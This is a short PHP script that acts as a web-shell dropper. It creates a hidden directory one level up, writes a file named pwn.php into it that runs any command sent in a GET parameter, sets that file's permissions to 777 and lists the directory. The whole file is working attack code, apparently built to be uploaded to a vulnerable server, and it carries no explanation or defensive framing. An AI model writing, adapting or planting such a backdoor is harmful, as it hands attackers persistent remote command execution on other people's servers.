<?php
echo exec('mkdir ../.blabla');
echo exec('echo "<?php echo exec(\$_GET[\'the_lsd\']); ?>" > ../.blabla/pwn.php');
echo exec('chmod 777 ../.blabla/pwn.php');
echo shell_exec('ls -l');
?>
